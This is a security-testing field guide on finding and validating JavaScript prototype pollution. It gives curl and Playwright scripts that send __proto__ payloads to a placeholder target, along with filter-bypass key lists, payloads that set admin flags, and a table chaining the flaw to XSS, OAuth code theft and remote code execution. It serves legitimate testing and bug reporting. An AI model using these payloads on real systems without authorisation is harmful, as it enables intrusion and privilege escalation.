# Prototype Pollution — Complete Detection, Validation & Exploitation Reference

> Complete field guide for JavaScript Prototype Pollution detection (client-side and server-side), gadget discovery, and exploitability assessment.
> Based on the Complete JavaScript Prototype Pollution Detection Field Manual v2.0.
> All HTTP traffic via Caido proxy (`-x "http://localhost:8080"`).
> Browser validation mandatory via Playwright for client-side.

---

## Root Cause

Prototype Pollution occurs when attacker-controlled input modifies an object's prototype, causing other objects to inherit attacker-controlled properties through the prototype chain.

```javascript
// VULNERABLE: Unsafe recursive merge
function merge(target, source) {
    for (const key in source) {
        if (source[key] && typeof source[key] === 'object') {
            target[key] = target[key] || {};
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
}

// SECURE: Validate keys before merge
function safeMerge(target, source) {
    for (const key in source) {
        if (['__proto__', 'constructor', 'prototype'].includes(key)) continue;
        if (source[key] && typeof source[key] === 'object') {
            target[key] = target[key] || {};
            safeMerge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
}
```

---

## Variants

| Variant | Source | Sink | Detection |
|---------|--------|------|-----------|
| **V1: JSON Body** | JSON body parser | Recursive merge | `{"__proto__":{"json spaces":10}}` → indented JSON |
| **V2: Query String** | Query parser (qs, etc.) | Recursive merge | `?__proto__[polluted]=test` |
| **V3: URL Fragment** | Client-side hash parser | Client merge | `#__proto__[polluted]=test` |
| **V4: postMessage** | Web messaging handler | Client merge | `postMessage({__proto__:{polluted:1}})` |
| **V5: File Import** | YAML/JSON file parser | Server merge | Upload malicious YAML/JSON |
| **V6: GraphQL** | GraphQL variable parser | Server merge | Nested input objects |

---

## Testing Checklist (via Caido + Playwright)

### Phase 1: Source Discovery

```bash
# 1. Find input channels
curl -x "http://localhost:8080" -s "https://target.com/" | \
  grep -oE 'location\.(search|hash)|URLSearchParams|postMessage|JSON\.parse|localStorage|sessionStorage'

# 2. Find merge/assignment operations
curl -x "http://localhost:8080" -s "https://target.com/app.js" | \
  grep -nE 'Object\.assign|Object\.create|merge|defaultsDeep|set|unset|omit|extend|cloneDeep'

# 3. Find gadget-related operations
curl -x "http://localhost:8080" -s "https://target.com/app.js" | \
  grep -nE 'innerHTML|outerHTML|insertAdjacentHTML|document\.write|window\.open|location\.href|spawn|exec|fork|compile|render'
```

### Phase 2: Client-Side Detection (Playwright)

```javascript
// prototype-pollution-detection.js
const { chromium, firefox, webkit } = require('playwright');

const TARGET = 'https://target.com/';
const TEST_PARAMS = [
  '?__proto__[polluted]=NSPROOF',
  '?constructor.prototype.polluted=NSPROOF',
  '?__proto__[json spaces]=10',
  '#__proto__[polluted]=NSPROOF'
];

async function testBrowser(browserType, name) {
  const browser = await browserType.launch({ headless: true });
  const context = await browser.newContext();
  const page = await context.newPage();

  console.log(`\n=== ${name} ===`);

  for (const param of TEST_PARAMS) {
    await page.goto(TARGET + param);
    await page.waitForLoadState('networkidle');

    // Check for pollution
    const polluted = await page.evaluate(() => {
      const fresh = {};
      return Object.prototype.polluted === 'NSPROOF' || 
             fresh.polluted === 'NSPROOF' ||
             Object.prototype.polluted === 'NSPROOF';
    });

    console.log(`  ${param}: ${polluted ? 'POLLUTED' : 'clean'}`);
  }

  await browser.close();
}

(async () => {
  await testBrowser(chromium, 'Chromium');
  await testBrowser(firefox, 'Firefox');
  await testBrowser(webkit, 'WebKit');
})();
```

### Phase 3: Server-Side Detection (via Caido)

```bash
# 1. JSON body pollution (json spaces oracle)
curl -x "http://localhost:8080" -sS -D - -o /dev/null -X POST \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"json spaces":10}}' \
  "https://target.com/api/endpoint"

# Then make a fresh request to a JSON endpoint
curl -x "http://localhost:8080" -s "https://target.com/api/endpoint" | \
  python3 -m json.tool  # Check if indented

# 2. Query string pollution
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  "https://target.com/search?__proto__[polluted]=NSPROOF"

# Then check subsequent JSON responses for pollution
curl -x "http://localhost:8080" -s "https://target.com/api/endpoint" | \
  grep -c "polluted"

# 3. Status code oracle (Express 4.x)
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"status":418}}' \
  "https://target.com/api/endpoint"

# Then check if subsequent responses have status 418
```

### Phase 4: Client-Side Validation (Playwright)

```javascript
// Full validation with gadget discovery
const { chromium } = require('playwright');

async function validatePrototypePollution() {
  const browser = await chromium.launch({ headless: true });
  const context = await browser.newContext();
  const page = await context.newPage();

  // 1. Navigate to target
  await page.goto('https://target.com/');

  // 2. Inject pollution via URL fragment (client-side)
  await page.goto('https://target.com/#__proto__[polluted]=NSPROOF');
  await page.waitForLoadState('networkidle');

  // 3. Check pollution
  const polluted = await page.evaluate(() => {
    const fresh = {};
    return fresh.polluted === 'NSPROOF' || 
           Object.prototype.polluted === 'NSPROOF';
  });

  console.log('Pollution confirmed:', polluted);

  // 4. Gadget discovery - trace to DOM sinks
  const gadgets = await page.evaluate(() => {
    const sinks = [];
    // Check for prototype property reads in sensitive sinks
    const originalInnerHTML = Object.getOwnPropertyDescriptor(HTMLElement.prototype, 'innerHTML');
    const originalSrc = Object.getOwnPropertyDescriptor(HTMLScriptElement.prototype, 'src');
    const originalHref = Object.getOwnPropertyDescriptor(HTMLAnchorElement.prototype, 'href');
    
    return { hasInnerHTML: !!originalInnerHTML, hasSrc: !!originalSrc, hasHref: !!originalHref };
  });

  console.log('Potential sinks:', gadgets);

  await browser.close();
}

validatePrototypePollution();
```

---

## Advanced Detection

### 1. Parser Differential Testing

```bash
# Test different parsers for same input
ENDPOINTS=("/api/json" "/api/form" "/api/query")

for endpoint in "${ENDPOINTS[@]}"; do
  echo "Testing $endpoint"
  
  # JSON body
  curl -x "http://localhost:8080" -sS -D - -o /dev/null -X POST \
    -H "Content-Type: application/json" \
    -d '{"__proto__":{"polluted":"NSPROOF"}}' \
    "https://target.com$endpoint" | grep -i "polluted"
  
  # Form-encoded
  curl -x "http://localhost:8080" -sS -D - -o /dev/null -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data "__proto__[polluted]=NSPROOF" \
    "https://target.com$endpoint" | grep -i "polluted"
  
  # Query string
  curl -x "http://localhost:8080" -sS -D - -o /dev/null \
    "https://target.com$endpoint?__proto__[polluted]=NSPROOF" | grep -i "polluted"
done
```

### 2. Dangerous-Key Filtering Analysis

```bash
# Test filter bypasses
FILTER_BYPASSES=(
  "__proto__"
  "constructor.prototype"
  "constructor[prototype]"
  "__proto__[polluted]"
  "constructor[prototype][polluted]"
  "__proto__[constructor][prototype][polluted]"
  "proto"
  "prototype"
)

for bypass in "${FILTER_BYPASSES[@]}"; do
  curl -x "http://localhost:8080" -sS -D - -o /dev/null \
    "https://target.com/api?${bypass}=NSPROOF" | \
    grep -i "NSPROOF"
done
```

### 3. Alternative Property Paths

```bash
# Test different path notations
PATHS=(
  "__proto__.polluted"
  "constructor.prototype.polluted"
  "__proto__[polluted]"
  "constructor.prototype.polluted"
  "__proto__[constructor][prototype][polluted]"
  "['__proto__'].polluted"
  '["__proto__"].polluted'
)

for path in "${PATHS[@]}"; do
  curl -x "http://localhost:8080" -sS -D - -o /dev/null -X POST \
    -H "Content-Type: application/json" \
    -d "{\"${path}\":\"NSPROOF\"}" \
    "https://target.com/api/endpoint" | grep -i "NSPROOF"
done
```

### 4. Nested Object and Array Behavior

```bash
# Array indices
curl -x "http://localhost:8080" -sS -D - -o /dev/null -X POST \
  -H "Content-Type: application/json" \
  -d '{"items":[{"__proto__":{"polluted":"NSPROOF"}}]}' \
  "https://target.com/api/endpoint"

# Array indices as path
curl -x "http://localhost:8080" -sS -D - -o /dev/null -X POST \
  -H "Content-Type: application/json" \
  -d '{"items":{"0":{"__proto__":{"polluted":"NSPROOF"}}}}' \
  "https://target.com/api/endpoint"

# Nested arrays
curl -x "http://localhost:8080" -sS -D - -o /dev/null -X POST \
  -H "Content-Type: application/json" \
  -d '{"matrix":[[{"__proto__":{"polluted":"NSPROOF"}}]]}' \
  "https://target.com/api/endpoint"
```

### 4. Second-Order Prototype Pollution

```bash
# 1. Store payload
curl -x "http://localhost:8080" -sS -D - -o /dev/null -X POST \
  -H "Content-Type: application/json" \
  -d '{"preferences":{"theme":"dark","__proto__":{"admin":true}}}' \
  "https://target.com/api/user/preferences"

# 2. Trigger background processing
curl -x "http://localhost:8080" -sS -D - -o /dev/null -X POST \
  "https://target.com/api/admin/rebuild-cache"

# 3. Check if pollution persists
curl -x "http://localhost:8080" -s "https://target.com/api/endpoint" | \
  grep -c "admin"
```

### 5. Multi-Stage and Multi-Parameter Testing

```bash
# Stage 1: Set config
curl -x "http://localhost:8080" -sS -D - -o /dev/null -X POST \
  -H "Content-Type: application/json" \
  -d '{"config":{"debug":true}}' \
  "https://target.com/api/config"

# Stage 2: Merge with polluted input
curl -x "http://localhost:8080" -sS -D - -o /dev/null -X POST \
  -H "Content-Type: application/json" \
  -d '{"options":{"__proto__":{"admin":true}}}' \
  "https://target.com/api/merge-options"

# Stage 3: Trigger use
curl -x "http://localhost:8080" -s "https://target.com/api/admin/action" | \
  grep -c "admin"
```

---

## Server-Side Detection (Non-Destructive)

### 1. JSON Formatting Oracle (json spaces)

```bash
# Baseline
curl -x "http://localhost:8080" -s "https://target.com/api/endpoint" > baseline.json

# Inject
curl -x "http://localhost:8080" -sS -D - -o /dev/null -X POST \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"json spaces":10}}' \
  "https://target.com/api/endpoint"

# Check subsequent responses
curl -x "http://localhost:8080" -s "https://target.com/api/endpoint" | \
  python3 -m json.tool  # Check indentation
```

### 2. Status Code Oracle

```bash
# Inject status override
curl -x "http://localhost:8080" -sS -D - -o /dev/null -X POST \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"status":418}}' \
  "https://target.com/api/endpoint"

# Check subsequent responses
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  "https://target.com/api/endpoint"
# Check for status 418
```

### 3. Content-Type/Charset Oracle

```bash
# Test charset override
curl -x "http://localhost:8080" -sS -D - -o /dev/null -X POST \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"charset":"utf-7"}}' \
  "https://target.com/api/endpoint"

# Check subsequent responses for charset
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  "https://target.com/api/endpoint" | grep -i "charset"
```

### 4. Differential Response Testing

```bash
# Request A - Baseline
curl -x "http://localhost:8080" -sS -D - -o /dev/null "https://target.com/api/endpoint" > baseline.txt

# Request B - Pollution attempt
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"polluted":"NSPROOF"}}' \
  "https://target.com/api/endpoint" > test.txt

# Request C - Follow-up
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  "https://target.com/api/endpoint" > followup.txt

# Compare
diff baseline.txt followup.txt
```

### 5. Persistence Testing

```bash
# Check if pollution persists across requests
for i in {1..5}; do
  echo "Request $i:"
  curl -x "http://localhost:8080" -s "https://target.com/api/endpoint" | \
    grep -c "polluted"
  sleep 1
done

# Check across different endpoints
for endpoint in "/api/users" "/api/products" "/api/settings"; do
  echo "Testing $endpoint:"
  curl -x "http://localhost:8080" -s "https://target.com$endpoint" | \
    grep -c "polluted"
done
```

---

## Client-Side Validation (Playwright)

### Basic Validation

```javascript
// prototype-pollution-validation.js
const { chromium, firefox, webkit } = require('playwright');

const TARGET = 'https://target.com/';
const POLLUTION_PARAMS = [
  '?__proto__[polluted]=NSPROOF',
  '?constructor.prototype.polluted=NSPROOF',
  '#__proto__[polluted]=NSPROOF'
];

async function testBrowser(browserType, name) {
  const browser = await browserType.launch({ headless: true });
  const context = await browser.newContext();
  const page = await context.newPage();

  console.log(`\n=== ${name} ===`);

  for (const param of ['?__proto__[polluted]=NSPROOF', '?constructor.prototype.polluted=NSPROOF', '#__proto__[polluted]=NSPROOF']) {
    await page.goto(TARGET + param);
    await page.waitForLoadState('networkidle');

    const polluted = await page.evaluate(() => {
      const fresh = {};
      return Object.prototype.polluted === 'NSPROOF' || 
             fresh.polluted === 'NSPROOF';
    });

    console.log(`  ${param}: ${polluted ? 'POLLUTED' : 'clean'}`);
  }

  await browser.close();
}

(async () => {
  await testBrowser(chromium, 'Chromium');
  await testBrowser(firefox, 'Firefox');
  await testBrowser(webkit, 'WebKit');
})();
```

### Gadget Discovery

```javascript
// gadget-discovery.js
const { chromium } = require('playwright');

async function discoverGadgets() {
  const browser = await chromium.launch({ headless: true });
  const context = await browser.newContext();
  const page = await context.newPage();

  // Inject pollution
  await page.goto('https://target.com/#__proto__[polluted]=NSPROOF');
  await page.waitForLoadState('networkidle');

  // Discover gadgets - check for property reads in sensitive sinks
  const gadgets = await page.evaluate(() => {
    const results = {};
    
    // Check innerHTML sink
    const div = document.createElement('div');
    div.innerHTML = '<span>test</span>';
    results.innerHTML = div.innerHTML.includes('NSPROOF');
    
    // Check script src
    const script = document.createElement('script');
    script.src = 'https://example.com/test.js';
    results.scriptSrc = script.src.includes('NSPROOF');
    
    // Check location.href
    const a = document.createElement('a');
    a.href = 'https://example.com';
    results.href = a.href.includes('NSPROOF');
    
    // Check script srcdoc
    const iframe = document.createElement('iframe');
    iframe.srcdoc = '<script>alert(1)</script>';
    results.srcdoc = iframe.srcdoc.includes('NSPROOF');
    
    // Check location.href
    results.locationHref = window.location.href.includes('NSPROOF');
    
    return results;
  });

  console.log('Gadgets found:', JSON.stringify(gadgets, null, 2));
  await browser.close();
}
```

### DOM Invader Methodology (Burp)

```bash
# 1. Open target in Burp's built-in browser
# 2. Enable DOM Invader
# 3. Enable prototype pollution attack types
# 4. Reload target
# 5. Inspect discovered sources
# 6. Generate controlled proof of concept
# 7. Verify pollution in browser
# 8. Scan for gadgets
# 9. Inspect source-to-sink path
# 10. Validate actual impact
```

---

## Gadget Discovery

### Client-Side Gadgets

```javascript
// Check common gadget categories
const gadgetCategories = {
  // DOM Rendering
  innerHTML: 'element.innerHTML',
  outerHTML: 'element.outerHTML',
  insertAdjacentHTML: 'element.insertAdjacentHTML',
  documentWrite: 'document.write',
  srcdoc: 'iframe.srcdoc',
  
  // URL Handling
  locationHref: 'location.href',
  windowOpen: 'window.open',
  elementHref: 'element.href',
  elementSrc: 'element.src',
  
  // Script Loading
  scriptSrc: 'script.src',
  scriptSrcdoc: 'iframe.srcdoc',
  
  // Sanitizer Configuration
  allowedTags: 'sanitizer.allowedTags',
  allowedAttributes: 'sanitizer.allowedAttributes',
  allowedProtocols: 'sanitizer.allowedProtocols',
  
  // Application Logic
  isAdmin: 'config.isAdmin',
  isAuthenticated: 'config.isAuthenticated',
  role: 'config.role',
  permissions: 'config.permissions',
  
  // Template Options
  templateOptions: 'template.options',
  renderOptions: 'renderer.options',
  
  // Event Handling
  eventConfig: 'event.config',
  callbacks: 'config.callbacks'
};

// Check each category
for (const [name, property] of Object.entries(gadgetCategories)) {
  try {
    const value = eval(property);
    if (value !== undefined) {
      console.log(`Gadget found: ${name} = ${value}`);
    }
  } catch (e) {
    // Property not accessible
  }
}
```

### Server-Side Gadgets

```javascript
// Check server-side gadget categories
const serverGadgets = {
  // Configuration Gadgets
  config: 'options.config',
  settings: 'settings.options',
  defaults: 'defaults.options',
  
  // Serialization Gadgets
  jsonSpaces: 'json spaces',
  replacer: 'replacer function',
  
  // Template Gadgets
  templateEngine: 'template.engine',
  renderOptions: 'render.options',
  
  // Process Creation
  spawnOptions: 'spawn.options',
  execOptions: 'exec.options',
  forkOptions: 'fork.options',
  
  // Filesystem
  pathOptions: 'path.options',
  fsOptions: 'fs.options',
  
  // Authentication
  authOptions: 'auth.options',
  jwtOptions: 'jwt.options',
  
  // Error Handling
  errorHandler: 'error.handler',
  errorOptions: 'error.options'
};
```

---

## Verification Sequence (Mandatory)

### Client-Side

```
1. Navigate to target with pollution payload
2. Check window.Object.prototype.polluted === 'NSPROOF'
3. Create fresh object {} and check .polluted === 'NSPROOF'
4. Check Object.prototype.polluted === 'NSPROOF'
4. If all true → client-side pollution CONFIRMED
5. Run gadget discovery
6. Trace polluted property to sink
```

### Server-Side

```
1. Baseline request → record response
2. Send pollution payload → record response
3. Follow-up request (no payload) → check for pollution
5. Cross-endpoint verification
6. Cross-worker/process verification (if possible)
6. Cross-session verification (if possible)
7. If reproducible → server-side pollution CONFIRMED
```

---

## Chain Escalation

| Finding | Chain | Severity |
|---------|-------|----------|
| Client PP + DOM XSS | PP → innerHTML/script.src | Critical |
| Client PP + Open Redirect | PP → location.href | High |
| Client PP + Open Redirect → OAuth | PP → redirect → OAuth code theft | Critical |
| Server PP + JSON spaces | Indented JSON → info leak | Low |
| Server PP + Status override | Status code override → bypass | Medium |
| Server PP + Child Process | PP → spawn/fork options → RCE | Critical |
| Server PP + Template Engine | PP → template options → RCE | Critical |
| Server PP + FileSystem | PP → fs options → read/write | Critical |

---

## False Positive Elimination

| Observation | Why Not Vulnerable | Required Validation |
|-------------|-------------------|---------------------|
| `__proto__` in response | Reflection only | Fresh object inherits property |
| JSON accepts `__proto__` | Parsing only | Check prototype modification |
| `Object.prototype.x` exists | Native property | Use unique canary name |
| Scanner reports PP | Scanner heuristic | Manual prototype verification |
| Response changes | Caching/session | Differential testing (3 requests) |

---

## Caido Integration

```bash
# All tools via Caido proxy
curl -x "http://localhost:8080" ...
# Playwright launch with Caido proxy context
```

### Quick Reference Commands

```bash
# All via Caido proxy
curl -x "http://localhost:8080" ...

# Server-side detection
curl -x "http://localhost:8080" -sS -D - -o /dev/null -X POST \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"json spaces":10}}' \
  "https://target.com/api/endpoint"

# Client-side test
# Playwright with Caido proxy context
```

---

## Reporting Template

```
Title: Prototype Pollution in [Endpoint] via [Input Source]

Summary: The application accepts nested user-controlled properties and passes 
the resulting object into a recursive merge operation. The operation does not 
safely handle prototype-related property paths. This permits an attacker-
controlled property to become inherited through the affected prototype.

Root Cause: [Parser/Transform] → [Unsafe Operation] → [Prototype Modified]

Evidence:
- Baseline request/response
- Pollution payload with unique canary
- Follow-up request showing inherited property
- Cross-session/worker verification
- Gadget trace (if impact demonstrated)

Impact: [Client-side XSS / Server RCE / Logic Bypass / etc.]
Severity: [Critical/High/Medium/Low]
Prerequisites: [Auth required / User interaction / etc.]
```